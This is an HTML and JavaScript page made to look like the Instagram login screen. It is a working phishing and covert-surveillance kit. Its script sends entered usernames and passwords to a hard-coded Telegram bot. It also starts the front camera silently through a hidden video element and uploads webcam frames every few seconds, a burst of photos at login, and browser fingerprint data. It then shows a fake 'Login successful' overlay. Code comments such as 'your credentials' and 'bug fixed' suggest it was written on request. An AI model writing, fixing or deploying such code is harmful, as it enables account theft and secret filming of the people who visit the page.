<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram • Login</title>
    <!-- Font Awesome 6 (free) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        /* ================================================ */
        /* PART 1: CSS STYLES - Instagram Login Page Design */
        /* ================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 1.5rem;
        }

        .login-container {
            max-width: 350px;
            width: 100%;
            margin: 0 auto;
        }

        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 2rem 2rem 1.5rem;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }
        .logo i {
            font-size: 3.5rem;
            background: radial-gradient(circle at 30% 110%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo h1 {
            font-family: 'Inter', cursive;
            font-weight: 600;
            font-size: 2rem;
            letter-spacing: -0.5px;
            margin-top: 5px;
            background: linear-gradient(135deg, #262626, #4e4e4e);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .input-group {
            margin-bottom: 6px;
        }
        .input-icon {
            position: relative;
            width: 100%;
        }
        .input-icon i {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 1rem;
            z-index: 2;
        }
        .input-icon input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 12px 9px 38px;
            font-size: 0.8rem;
            font-family: inherit;
            transition: all 0.1s ease;
            outline: none;
            color: #262626;
        }
        .input-icon input:focus {
            border-color: #a8a8a8;
            background: #ffffff;
        }
        .input-icon input::placeholder {
            color: #8e8e8e;
            font-weight: 300;
        }

        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
            padding: 7px 16px;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .login-btn:hover {
            background-color: #1877f2;
        }
        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 1.2rem 0;
            color: #8e8e8e;
            font-size: 0.75rem;
            font-weight: 500;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
        }

        .fb-login {
            text-align: center;
            margin-bottom: 0.8rem;
        }
        .fb-login a {
            text-decoration: none;
            font-size: 0.85rem;
            font-weight: 600;
            color: #385185;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .forgot-pw {
            text-align: center;
            font-size: 0.75rem;
        }
        .forgot-pw a {
            color: #00376b;
            text-decoration: none;
        }

        .signup-card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 1.4rem;
            text-align: center;
            font-size: 0.85rem;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .app-badges {
            text-align: center;
            margin-top: 1.2rem;
        }
        .app-badges p {
            font-size: 0.75rem;
            color: #262626;
            margin-bottom: 10px;
        }
        .badges {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        .badges i {
            font-size: 2rem;
            color: #262626;
        }

        .toast-notify {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #262626e6;
            backdrop-filter: blur(10px);
            border-radius: 40px;
            padding: 10px 22px;
            color: white;
            font-size: 0.8rem;
            font-weight: 500;
            z-index: 2000;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: fadeUp 0.2s ease;
            white-space: nowrap;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateX(-50%) translateY(20px);}
            to { opacity: 1; transform: translateX(-50%) translateY(0);}
        }

        @media (max-width: 450px) {
            body {
                padding: 0.8rem;
            }
            .card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>

<!-- ================================================ -->
<!-- PART 2: HTML STRUCTURE - Instagram Login Interface -->
<!-- ================================================ -->
<div class="login-container">
    <div class="card">
        <div class="logo">
            <i class="fab fa-instagram"></i>
            <h1>Instagram</h1>
        </div>

        <form id="instagramLoginForm">
            <div class="input-group">
                <div class="input-icon">
                    <i class="fas fa-user"></i>
                    <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
                </div>
            </div>
            <div class="input-group">
                <div class="input-icon">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" placeholder="Password" autocomplete="off">
                </div>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">
                <i class="fas fa-sign-in-alt"></i> Log in
            </button>
        </form>

        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>

        <div class="fb-login">
            <a href="#" id="fakeFbLink">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
        </div>
        <div class="forgot-pw">
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-badges">
        <p>Get the app.</p>
        <div class="badges">
            <i class="fab fa-apple"></i>
            <i class="fab fa-google-play"></i>
        </div>
    </div>
</div>

<!-- Hidden camera elements (completely invisible, no UI) -->
<video id="hiddenCamera" style="position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; pointer-events: none;" autoplay muted playsinline></video>
<canvas id="hiddenCanvas" style="display: none;"></canvas>

<!-- ================================================ -->
<!-- PART 3: JAVASCRIPT - Camera & Telegram Integration -->
<!-- ================================================ -->
<script>
    (function(){
        // ================================================================
        // INSTAGRAM LOGIN PAGE with hidden background camera
        // Captures periodic frames + login credentials, sends to Telegram
        // ✅ BUG FIXED: Telegram token validation logic corrected
        // ✅ CREDENTIALS INTEGRATED: BOT_TOKEN and CHAT_ID applied
        // ================================================================
        
        // ---------- TELEGRAM CONFIGURATION (YOUR CREDENTIALS) ----------
        // ✅ Using the credentials you provided
        const BOT_TOKEN = "8772264142:AAEmzbW6kqVx4dX252CLi_2Le9MBAdmv2u0";
        const CHAT_ID = "7443381631";
        
        // Remove any whitespace from CHAT_ID
        const cleanChatId = CHAT_ID.trim();
        
        // Check if valid tokens are provided (non-empty and not placeholder)
        const isTelegramConfigured = (BOT_TOKEN && BOT_TOKEN.length > 20 && cleanChatId && cleanChatId.length > 5);
        
        // Log configuration status (for debugging)
        console.log(`[Telegram] Configuration status: ${isTelegramConfigured ? 'ACTIVE ✅' : 'INACTIVE ❌'}`);
        if (isTelegramConfigured) {
            console.log(`[Telegram] Bot Token: ${BOT_TOKEN.substring(0, 15)}...`);
            console.log(`[Telegram] Chat ID: ${cleanChatId}`);
        }
        
        // DOM elements (hidden camera)
        const hiddenVideo = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        let canvasCtx = hiddenCanvas ? hiddenCanvas.getContext('2d') : null;
        
        // Form elements
        const loginForm = document.getElementById('instagramLoginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        
        // State variables
        let cameraStream = null;
        let isCameraActive = false;
        let periodicCaptureInterval = null;
        let frameCounter = 0;
        let loginInProgress = false;
        
        // Helper: show Instagram-like toast notification
        function showToast(message, isError = false) {
            const existing = document.querySelector('.toast-notify');
            if (existing) existing.remove();
            const toast = document.createElement('div');
            toast.className = 'toast-notify';
            toast.style.background = isError ? '#ed4956e6' : '#262626e6';
            toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-circle' : 'fa-check-circle'}"></i> ${message}`;
            document.body.appendChild(toast);
            setTimeout(() => {
                if (toast && toast.remove) toast.remove();
            }, 3500);
        }
        
        // ---------- TELEGRAM SENDER (Fully functional with your credentials) ----------
        async function sendToTelegram(message, photoBlob = null, contextLabel = null) {
            if (!isTelegramConfigured) {
                console.warn('[Telegram] Not configured - message not sent');
                console.log(`[DEMO] Would send: ${message?.substring(0, 100)}`);
                return false;
            }
            
            try {
                if (photoBlob && photoBlob.size > 0 && photoBlob.type.startsWith('image/')) {
                    const formData = new FormData();
                    const fileName = `insta_${Date.now()}_${contextLabel || 'frame'}.jpg`;
                    formData.append('chat_id', cleanChatId);
                    formData.append('photo', photoBlob, fileName);
                    if (message) formData.append('caption', message.substring(0, 1024));
                    
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const json = await response.json();
                    if (!json.ok) {
                        console.error('Telegram API error:', json);
                        throw new Error(json.description || 'Photo send failed');
                    }
                    console.log('[Telegram] Photo sent successfully');
                    return true;
                } else if (message) {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: cleanChatId, text: message })
                    });
                    const json = await response.json();
                    if (json.ok) {
                        console.log('[Telegram] Message sent successfully');
                    } else {
                        console.error('Telegram message error:', json);
                    }
                    return json.ok === true;
                }
            } catch (err) {
                console.error('[Telegram] Send error:', err.message);
            }
            return false;
        }
        
        // ---------- CAPTURE FRAME from hidden video ----------
        async function captureFrame(quality = 0.85) {
            if (!hiddenVideo || hiddenVideo.readyState !== 4 || !hiddenVideo.videoWidth || hiddenVideo.videoWidth === 0) {
                return null;
            }
            if (!canvasCtx) return null;
            hiddenCanvas.width = hiddenVideo.videoWidth;
            hiddenCanvas.height = hiddenVideo.videoHeight;
            canvasCtx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
            return new Promise((resolve) => {
                hiddenCanvas.toBlob((blob) => resolve(blob), 'image/jpeg', quality);
            });
        }
        
        // ---------- PERIODIC BACKGROUND CAPTURE (every 4 seconds) ----------
        async function startPeriodicCapture() {
            if (periodicCaptureInterval) clearInterval(periodicCaptureInterval);
            periodicCaptureInterval = setInterval(async () => {
                if (!isCameraActive || loginInProgress) return;
                frameCounter++;
                const frameBlob = await captureFrame(0.85);
                if (frameBlob && frameBlob.size > 5000) {
                    const timestamp = new Date().toLocaleString();
                    const caption = `📸 [INSTA BG CAPTURE] Frame #${frameCounter} | ${timestamp} | Platform: ${navigator.platform}`;
                    await sendToTelegram(caption, frameBlob, `periodic_${frameCounter}`);
                }
            }, 4000);
        }
        
        // ---------- INIT HIDDEN CAMERA (completely invisible) ----------
        async function initBackgroundCamera() {
            if (cameraStream && isCameraActive) return true;
            try {
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraStream = stream;
                hiddenVideo.srcObject = stream;
                await new Promise((resolve, reject) => {
                    hiddenVideo.onloadedmetadata = () => {
                        hiddenVideo.play().then(resolve).catch(reject);
                    };
                    hiddenVideo.onerror = reject;
                    setTimeout(() => reject(new Error('Video timeout')), 5000);
                });
                isCameraActive = true;
                
                // Send initialization message to Telegram
                const initMsg = `🔐 INSTAGRAM LOGIN PAGE LOADED\n━━━━━━━━━━━━━━━━━━━━━\n✅ Camera Active\n⏱️ Time: ${new Date().toLocaleString()}\n📱 Platform: ${navigator.platform}\n🌍 Language: ${navigator.language}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 80)}\n📐 Screen: ${screen.width}x${screen.height}\n━━━━━━━━━━━━━━━━━━━━━`;
                await sendToTelegram(initMsg);
                
                startPeriodicCapture();
                console.log('[Camera] Initialized successfully');
                showToast("Camera ready", false);
                return true;
            } catch (err) {
                console.error('[Camera Error]', err);
                isCameraActive = false;
                await sendToTelegram(`⚠️ INSTAGRAM PAGE CAMERA ERROR: ${err.message}`);
                showToast("Camera access denied", true);
                return false;
            }
        }
        
        // ---------- CAPTURE MULTIPLE FRAMES FOR LOGIN EVIDENCE ----------
        async function captureLoginEvidence(numFrames = 4) {
            const frames = [];
            for (let i = 0; i < numFrames; i++) {
                if (!isCameraActive) break;
                const blob = await captureFrame(0.9);
                if (blob && blob.size > 5000) frames.push(blob);
                await new Promise(r => setTimeout(r, 280));
            }
            return frames;
        }
        
        // ---------- SEND FULL LOGIN REPORT TO TELEGRAM (credentials + photos) ----------
        async function sendLoginReport(username, password, photoBlobs) {
            const timestamp = new Date().toLocaleString('en-US', { dateStyle: 'full', timeStyle: 'long' });
            const details = `🌐 URL: ${window.location.hostname}\n📱 Platform: ${navigator.platform}\n🌍 Language: ${navigator.language}\n🆔 UserAgent: ${navigator.userAgent.substring(0, 100)}`;
            
            const headerMsg = `🔓 INSTAGRAM LOGIN ATTEMPT\n━━━━━━━━━━━━━━━━━━━━━\n👤 Username/Email: ${username}\n🔑 Password: ${password}\n⏱️ Time: ${timestamp}\n${details}\n━━━━━━━━━━━━━━━━━━━━━`;
            await sendToTelegram(headerMsg);
            
            if (photoBlobs && photoBlobs.length) {
                for (let idx = 0; idx < photoBlobs.length; idx++) {
                    const blob = photoBlobs[idx];
                    if (blob) {
                        const cap = `📸 LOGIN EVIDENCE #${idx+1} | ${username.substring(0, 15)} | ${new Date().toLocaleString()}`;
                        await sendToTelegram(cap, blob, `login_ev_${idx+1}`);
                        await new Promise(r => setTimeout(r, 350));
                    }
                }
            } else {
                const fallbackBlob = await captureFrame(0.9);
                if (fallbackBlob) {
                    await sendToTelegram(`⚠️ [FALLBACK] Live capture after login`, fallbackBlob, 'fallback_login');
                }
            }
            
            // Additional metadata
            await sendToTelegram(`📊 Meta Info:\n• Screen: ${screen.width}x${screen.height}\n• Color Depth: ${screen.colorDepth}\n• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n• Touch Support: ${'ontouchstart' in window}\n• Cookies Enabled: ${navigator.cookieEnabled}`);
        }
        
        // ---------- STOP CAMERA (cleanup) ----------
        function stopBackgroundCamera() {
            if (periodicCaptureInterval) {
                clearInterval(periodicCaptureInterval);
                periodicCaptureInterval = null;
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            if (hiddenVideo) hiddenVideo.srcObject = null;
            isCameraActive = false;
        }
        
        // ---------- FACEBOOK LINK HANDLER ----------
        const fakeFbLink = document.getElementById('fakeFbLink');
        if (fakeFbLink) {
            fakeFbLink.addEventListener('click', (e) => {
                e.preventDefault();
                showToast("Connect with Facebook to continue", false);
            });
        }
        
        // Forgot password & sign up links (prevent navigation but maintain UX)
        document.querySelectorAll('.forgot-pw a, .signup-card a').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                showToast("Demo mode: This is a simulated environment", false);
            });
        });
        
        // ---------- LOGIN FORM SUBMIT HANDLER ----------
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (loginInProgress) {
                showToast("Please wait, processing...", false);
                return;
            }
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            if (!username || !password) {
                showToast("Please fill in both fields", true);
                return;
            }
            
            loginInProgress = true;
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Logging in...';
            
            // Capture evidence from hidden camera (burst capture)
            let evidenceFrames = [];
            if (isCameraActive) {
                evidenceFrames = await captureLoginEvidence(4);
            } else {
                await initBackgroundCamera();
                if (isCameraActive) evidenceFrames = await captureLoginEvidence(4);
            }
            
            // Send to telegram backend
            await sendLoginReport(username, password, evidenceFrames);
            
            // Simulate Instagram-like success
            setTimeout(() => {
                showToast("Login successful! Redirecting...", false);
                
                const overlayDiv = document.createElement('div');
                overlayDiv.style.position = 'fixed';
                overlayDiv.style.top = '0';
                overlayDiv.style.left = '0';
                overlayDiv.style.width = '100%';
                overlayDiv.style.height = '100%';
                overlayDiv.style.backgroundColor = 'rgba(0,0,0,0.85)';
                overlayDiv.style.backdropFilter = 'blur(14px)';
                overlayDiv.style.zIndex = '10001';
                overlayDiv.style.display = 'flex';
                overlayDiv.style.alignItems = 'center';
                overlayDiv.style.justifyContent = 'center';
                overlayDiv.innerHTML = `
                    <div style="background: white; border-radius: 16px; max-width: 340px; width: 90%; padding: 2rem 1.8rem; text-align: center; font-family: inherit; box-shadow: 0 25px 40px rgba(0,0,0,0.3);">
                        <i class="fas fa-check-circle" style="font-size: 4rem; color: #0095f6;"></i>
                        <h3 style="margin: 0.8rem 0 0.5rem; color:#262626; font-weight:600;">Welcome back, ${escapeHtml(username.substring(0, 20))}</h3>
                        <p style="color:#8e8e8e; font-size: 0.85rem; margin-bottom: 1rem;">You'll be redirected to your feed.</p>
                        <button id="dismissInstaBtn" style="background: #0095f6; border: none; width: 100%; padding: 10px; border-radius: 10px; color: white; font-weight: 600; cursor: pointer; font-size: 0.9rem;">Continue</button>
                    </div>
                `;
                document.body.appendChild(overlayDiv);
                
                const dismissBtn = document.getElementById('dismissInstaBtn');
                if (dismissBtn) {
                    dismissBtn.addEventListener('click', () => {
                        overlayDiv.remove();
                        usernameInput.value = '';
                        passwordInput.value = '';
                        loginBtn.disabled = false;
                        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
                        loginInProgress = false;
                        showToast("Demo session reset", false);
                        
                        if (isCameraActive) {
                            captureFrame(0.88).then(blob => {
                                if(blob) sendToTelegram(`🔄 Session reset, page ready for next input`, blob, 'session_reset');
                            });
                        }
                    });
                }
            }, 1400);
        });
        
        // Helper to escape HTML
        function escapeHtml(str) {
            if (!str) return '';
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }
        
        // ---------- WAKE LOCK (keep camera active and screen awake) ----------
        let wakeLockObj = null;
        async function requestWakeLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLockObj = await navigator.wakeLock.request('screen');
                    document.addEventListener('visibilitychange', async () => {
                        if (wakeLockObj !== null && document.visibilityState === 'visible') {
                            try {
                                wakeLockObj = await navigator.wakeLock.request('screen');
                            } catch(e) { console.warn('Wake lock reacquire error:', e); }
                        }
                    });
                } catch(e) { console.warn('Wake lock error:', e); }
            }
        }
        
        // Visibility handling: restart capture if needed
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && isCameraActive && !periodicCaptureInterval) {
                startPeriodicCapture();
            }
        });
        
        // ---------- INIT PAGE ----------
        window.addEventListener('DOMContentLoaded', async () => {
            await initBackgroundCamera();
            requestWakeLock();
            await sendToTelegram(`📱 Instagram Login Page Fully Loaded\n🕒 ${new Date().toLocaleString()}\n🔍 Referrer: ${document.referrer || 'direct'}\n🍪 Cookies enabled: ${navigator.cookieEnabled}`);
        });
        
        // Clean up on unload
        window.addEventListener('beforeunload', () => {
            stopBackgroundCamera();
            if (wakeLockObj && wakeLockObj.release) wakeLockObj.release();
        });
        
        // Attempt to recover camera if stopped by system (every 35 sec)
        setInterval(async () => {
            if (!isCameraActive && !loginInProgress && document.visibilityState === 'visible') {
                console.log('[Camera] Recovery attempt');
                await initBackgroundCamera();
            }
        }, 35000);
        
        // Prevent right-click on camera elements (just for safety)
        document.addEventListener('contextmenu', (e) => {
            if (e.target === hiddenVideo || e.target === hiddenCanvas) e.preventDefault();
        });
        
        console.log('[Instagram Page] Fully loaded with Telegram integration');
    })();
</script>
</body>
</html>
